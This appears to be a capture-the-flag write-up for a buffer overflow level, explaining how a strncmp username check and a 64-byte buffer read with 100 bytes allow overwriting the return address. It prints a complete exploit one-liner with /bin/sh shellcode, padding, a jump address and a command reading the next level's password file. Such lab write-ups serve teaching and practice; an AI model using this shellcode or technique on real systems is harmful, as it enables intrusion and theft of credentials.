# Buffer Overflow

see source.c

## Analysis

The program prompts for a username and a password, if the user is verified it lead to password input.

Seeing that the verify_user_name function is using strncmp and not strcmp that means that we can add everything we want after 'dat_wil', then because the buffer on the main function is 64 bytes and we are reading 100 bytes that means we can get over the stack and replace eip to jump on a payload.

```
(python -c "print('dat_wil' + '\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80')" ; python -c "print('A' * 80 + '\x47\xa0\x04\x08')"; echo "cat /home/users/level02/.pass") | ./level01 
```
